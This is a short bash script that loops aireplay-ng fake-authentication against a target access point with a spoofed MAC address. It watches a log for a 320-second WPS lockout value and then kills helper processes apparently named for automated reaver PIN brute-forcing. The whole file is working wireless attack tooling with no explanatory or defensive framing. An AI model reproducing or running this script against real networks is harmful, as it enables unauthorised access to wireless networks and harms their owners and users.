#!/bin/bash

while true

do

timeout 60s aireplay-ng -1 120 -a <BSSID> -h "$(cat /root/Act-MAC.txt)" -e '<ESSID>' <iface>

sleep 2
echo " "
echo " "
echo "Waiting for the next value!!!!! :-D"
echo " "
# backup ReMAC logfile
# cat /root/ReMAC-02.txt >> /root/ReMAC-02-LOG.txt
# automatic exit -> 2-3 - 320
RESP="$(tail -3 /root/ReMAC-02.txt | sed -e '/320\ seconds/!d' -e 's/[a-zA-Z[:punct:][:space:]\t]//g' | sort | uniq -d)"
if [ "$RESP" = "320" ]; then

echo "Value -> 320 exit !!! :-P"
echo " "

# kill process...
kill "$(ps aux | grep 'auto-reaver-simple' | sed -n '1p' | awk '{print $2}')"
kill "$(ps aux | grep 'auto-assoc-simple' | sed -n '1p' | awk '{print $2}')"
exit

else
echo "NO value -> continue !!! :-)"
echo " "
fi

done
